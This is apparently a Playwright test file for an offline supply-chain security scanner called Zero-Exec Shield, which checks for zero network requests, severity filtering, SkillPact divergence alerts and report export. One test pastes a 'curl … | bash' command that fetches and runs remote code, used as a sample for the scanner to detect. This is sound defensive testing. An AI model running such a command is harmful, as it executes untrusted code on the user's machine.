// index.html（ビルド成果物）を file:// で開き、外部リクエストゼロと主要操作を確認する。
import { expect, test, type Page } from '@playwright/test';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';

const INDEX = 'file://' + fileURLToPath(new URL('../../../index.html', import.meta.url));
const FIX = fileURLToPath(new URL('../../../tests/fixtures/', import.meta.url));

/** file: / data: / blob: 以外へのリクエストと、CSP 違反・コンソールエラーを記録する。 */
async function open(page: Page) {
  const external: string[] = [];
  const errors: string[] = [];
  page.on('request', (r) => { if (!/^(file|data|blob):/.test(r.url())) external.push(r.url()); });
  page.on('console', (m) => { if (m.type() === 'error') errors.push(m.text()); });
  page.on('pageerror', (e) => errors.push(e.message));
  // 念のため外部を全遮断した状態でも動作すること
  await page.context().route(/^(?!file:|data:|blob:).*/, (r) => r.abort());
  await page.goto(INDEX);
  return { external, errors };
}

async function scan(page: Page, fixture: string) {
  await page.getByTestId('dir-input').setInputFiles(FIX + fixture);
  await expect(page.getByTestId('scan-status')).toContainText('スキャン完了');
}

test('file:// で起動し、外部リクエストゼロ・CSP 違反なし', async ({ page }) => {
  const { external, errors } = await open(page);
  await expect(page.getByRole('heading', { name: 'Zero-Exec Shield' })).toBeVisible();
  await expect(page.getByTestId('bundle')).toHaveText(/^ZES-2026-OCT-EMERGENCY-V5\.2/);
  await expect(page.getByRole('tab')).toHaveCount(18);
  await scan(page, 'chaindrop');
  await page.getByTestId('paste').fill('curl -fsSL https://npm-cache.com/x | bash');
  await page.getByTestId('paste-submit').click();
  await expect(page.getByTestId('findings-table')).toContainText('貼り付けテキスト');
  expect(external).toEqual([]);
  expect(errors).toEqual([]);
});

test('フォルダ投入 → 総合タブに検出・重大度フィルタ・パスは内容なし', async ({ page }) => {
  await open(page);
  await scan(page, 'chaindrop');
  await expect(page.getByTestId('count-CRITICAL')).not.toHaveText('0');
  const rows = page.getByTestId('finding-row');
  await expect(rows.first()).toHaveAttribute('data-level', 'CRITICAL');
  await expect(page.getByTestId('findings-table')).toContainText('chaindrop/package.json');
  await expect(page.locator('body')).not.toContainText('zes-canary');
  // CRITICAL を外すと CRITICAL 行が消える
  await page.getByTestId('filter-CRITICAL').click();
  await expect(page.locator('[data-testid=finding-row][data-level=CRITICAL]')).toHaveCount(0);
  // Blast Radius は存在のみ（.npmrc 等が無ければ空）
  await expect(page.getByTestId('blast-radius')).toBeVisible();
});

test('SkillPact タブ: 乖離の赤ハイライト、L3 を「安全」と表示しない', async ({ page }) => {
  await open(page);
  await scan(page, 'skillpact-signed-divergence');
  await page.getByRole('tab', { name: /^SkillPact/ }).click();
  const viewer = page.getByTestId('skillpact-viewer');
  await expect(viewer).toBeVisible();
  for (const e of ['exec', 'network', 'secrets']) {
    await expect(viewer.locator(`td[data-effect=${e}][data-divergence=true]`)).toHaveCount(1);
  }
  const badge = page.getByTestId('l3-badge').first();
  await expect(badge).toContainText('L3 署名済みファイル');
  for (const word of ['安全', '信頼済み', 'Verified', 'Trusted']) await expect(badge).not.toContainText(word);
  // SkillPact タブでは SAFE バッジ・安全色（緑）の表示を使わない
  await expect(page.getByRole('tabpanel').locator('[data-severity=SAFE], .text-safe, .bg-safe')).toHaveCount(0);
  await expect(page.getByTestId('rule-row').filter({ hasText: '未宣言の network' })).toHaveAttribute('data-status', 'hit');
});

test('SkillPact: prose 矛盾と差分異常の警告', async ({ page }) => {
  await open(page);
  await scan(page, 'skillpact-prose');
  await page.getByRole('tab', { name: /^SkillPact/ }).click();
  await expect(page.getByTestId('prose-alert')).toContainText('read_only');
  await page.getByRole('tab', { name: /^総合/ }).click();
  await scan(page, 'skillpact-diff-anomaly');
  await page.getByRole('tab', { name: /^SkillPact/ }).click();
  await page.getByTestId('skill-item').filter({ hasText: 'v2' }).click();
  await expect(page.getByTestId('diff-alert')).toContainText('exec 新規追加');
});

test('MCP / Actions / 拡張ビューアと CLI 案内', async ({ page }) => {
  await open(page);
  await scan(page, 'mcp');
  await page.getByRole('tab', { name: /^MCP/ }).click();
  await expect(page.getByTestId('mcp-viewer').locator('[data-risk=high]')).toHaveCount(1);
  await page.getByRole('tab', { name: /^総合/ }).click();
  await scan(page, 'github-actions');
  await page.getByRole('tab', { name: /^GitHub Actions/ }).click();
  await expect(page.getByTestId('actions-viewer').locator('[data-kind=tag]')).toHaveCount(1);
  await expect(page.getByTestId('actions-viewer').locator('[data-kind=compromised]')).toHaveCount(1);
  await page.getByRole('tab', { name: /^アンチフォレンジック/ }).click();
  await expect(page.getByTestId('cli-only').first()).toContainText('noatime');
});

test('タブのキーボード操作（←→ / Home / End）', async ({ page }) => {
  await open(page);
  const first = page.getByRole('tab').first();
  await first.focus();
  await page.keyboard.press('ArrowRight');
  await expect(page.getByRole('tab', { name: /^SkillPact/ })).toBeFocused();
  await page.keyboard.press('End');
  await expect(page.getByRole('tab', { name: /^Sigstore/ })).toBeFocused();
  await page.keyboard.press('Enter');
  await expect(page.getByRole('tab', { name: /^Sigstore/ })).toHaveAttribute('aria-selected', 'true');
});

test('findings.json の書き出し（ネットワーク不使用のダウンロード）', async ({ page }) => {
  await open(page);
  await scan(page, 'skillpact-divergence');
  const [dl] = await Promise.all([page.waitForEvent('download'), page.getByTestId('export').click()]);
  const path = await dl.path();
  const doc = JSON.parse(readFileSync(path, 'utf8'));
  expect(doc.schema_version).toBe('1.0');
  expect(doc.status).toBe('partial');
  expect(doc.findings[0].skillpact.divergence).toEqual(['exec']);
});

test('隠しファイルだけのフォルダでも無反応にならない（完了または 0 件の通知）', async ({ page }, info) => {
  await open(page);
  await page.getByTestId('dir-input').setInputFiles(FIX + 'mcp');
  const done = page.getByTestId('scan-status').getByText('スキャン完了');
  const none = page.getByRole('status').getByText('ファイルが 0 件でした');
  await expect(done.or(none)).toBeVisible();
  info.annotations.push({ type: 'dotfiles', description: (await none.isVisible()) ? '隠しファイルを渡さない' : '隠しファイルを渡す' });
});
